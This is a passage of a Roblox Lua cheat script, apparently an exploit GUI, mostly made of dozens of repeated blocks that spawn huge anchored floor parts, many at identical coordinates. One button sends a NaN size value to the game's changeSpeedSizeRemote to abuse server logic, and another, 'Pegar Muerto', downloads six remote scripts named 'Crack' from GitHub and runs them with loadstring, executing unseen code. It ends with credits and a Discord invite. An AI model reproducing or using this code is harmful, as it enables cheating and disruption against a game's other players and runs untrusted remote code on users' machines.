    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1880.724609375, -9.709164142608643, -4258.2509765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1643.215576171875, -9.569722652435303, -3132.36572265625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1772.5018310546875, -9.354584217071533, -2139.459716796875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1665.8314208984375, -9.139444828033447, -1128.0208740234375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1673.664794921875, -9.9243054389953613, -176.67430114746094)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1895.2357177734375, -9.709166526794434, 789.939697265625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1991.6993408203125, -9.494027614593506, 1789.4617919921875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-2148.386962890625, -9.278889179229736, 2777.50146484375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-2334.718505859375, -9.06374979019165, 3752.33056640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-2430.8857421875, -9.8486104011535645, 4750.89208984375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-2477.38427734375, -9.633471488952637, 5754.65625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1474.8240966796875, -9.418332576751709, 4993.744140625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1239.12744140625, -9.203193664550781, 4206.31005859375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1682.2164306640625, -9.418331623077393, 6633.03125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1427.5582275390625, -9.203193187713623, 7548.80224609375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3823.29248046875, -9.063750267028809, 1757.0218505859375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4112.26171875, -9.848611354827881, 2757.71484375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4299.38330078125, -9.633472919464111, 3713.58056640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4433.6865234375, -9.4183349609375, 4715.2236328125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4646.71728515625, -9.203195571899414, 5683.84765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3911.37353515625, -9.988056182861328, 6502.482421875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3161.617431640625, -9.772918224334717, 6943.85986328125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-2052.14599609375, -9.9880542755126953, 8546.2861328125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1400.4658203125, -9.772915363311768, 9297.806640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1190.1282958984375, -9.4422254264354706, 10259.5078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2187.53564453125, -9.180280685424805, 9414.32421875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2896.7841796875, -9.180281639099121, 7566.1171875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3187.329345703125, -9.9651424884796143, 6555.640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3379.880615234375, -9.750005722045898, 5558.48876953125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3961.218017578125, -9.754025459289551, 6907.60400390625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3976.142822265625, -9.538886547088623, 7871.6318359375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3126.83544921875, -9.84867262840271, 802.1668090820312)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3662.20703125, -9.633533477783203, -80.66658020019531)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3609.484130859375, -9.418395519256592, -1017.3029174804688)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3753.300537109375, -9.2032551765441895, -1995.7613525390625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4743.466796875, -9.9881160259246826, -2393.3125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5736.89892578125, -9.772977828979492, -2010.5301513671875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4006.782958984375, -9.772977352142334, -3332.644287109375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3065.00146484375, -9.557837963104248, -3415.263916015625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4635.92431640625, -9.418395519256592, -103.13423919677734)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5439.66796875, -9.203256607055664, 866.9227294921875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5770.49462890625, -9.9881179332733154, 1845.7347412109375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5798.58203125, -9.772978782653809, 2813.786376953125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6413.759765625, -9.9881181716918945, 45.978721618652344)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-7281.08837890625, -9.342700004577637, -2053.28173828125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5939.85009765625, -9.557838439941406, -2980.478515625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3151.140380859375, -9.8764214515686035, 645.57568359375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(4175.984375, -9.661282062530518, 688.4006958007812)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3677.688232421875, -9.44614315032959, 1697.672607421875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2702.431640625, -9.231003761291504, 2118.501953125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3402.743896484375, -9.015864849090576, 3122.62060546875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3311.645263671875, -9.800727367401123, 4067.2041015625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(4368.765625, -9.800727128982544, 3317.60009765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(4876.06005859375, -9.585587978363037, 4320.9013671875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5258.15771484375, -9.370449542999268, 5299.39990234375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5620.71923828125, -9.155311584472656, 6254.36181640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5176.56591796875, -9.585587978363037, 2400.698486328125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(6081.796875, -9.370450019836426, 3295.412109375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5741.1318359375, -9.370449066162109, 1432.1351318359375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5813.77685546875, -9.155310153961182, 415.4798889160156)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(6412.279296875, -9.9401707649230957, -563.8019409179688)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(6898.72900390625, -9.725030422210693, -1527.509765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6474.01318359375, -9.557838439941406, -1076.6319580078125)
    WalkPart.Size = Vector3.new(20000,0,20000)
end)

Killer:AddButton("Tamaño NaN", function()
    local args = {"changeSize", 0/0}
    game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
end)
-- 📜 Lista de RAWs a ejecutar
local urls = {
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack2",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack3",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack4",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack5",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack6"
}

-- ⚡ Botón que ejecuta todos los scripts remotos
Killer:AddButton("Pegar Muerto", function()
    for _, url in ipairs(urls) do
        spawn(function()
            local success, response = pcall(function()
                return game:HttpGet(url)
            end)
            if success and response then
                local loadSuccess, err = pcall(function()
                    loadstring(response)()
                end)
                if not loadSuccess then
                    warn("[Pegar Muerto] Error ejecutando raw:", url, err)
                end
            else
                warn("[Pegar Muerto] No se pudo cargar:", url)
            end
        end)
    end
end)

local infoTab = window:AddTab("info")
infoTab:AddLabel("hecho por karma").TextSize = 20
infoTab:AddLabel("k1LL ON TOP OWNER ZIX").TextSize = 20
infoTab:AddLabel("https://discord.gg/FYqJrqeeG9").TextSize = 20

infoTab:AddButton("Copy Invite", function()
    local link = "https://discord.gg/FYqJrqeeG9"

    if setclipboard then
        setclipboard(link)

        game.StarterGui:SetCore("SendNotification", {
            Title = "Link Copied!";
            Text = "You can continue to Discord now.";
            Duration = 3;
        })

    else
        game.StarterGui:SetCore("SendNotification", {
            Title = "Error!";
            Text = "Not Supported.";
            Duration = 3;
        })
    end
end)
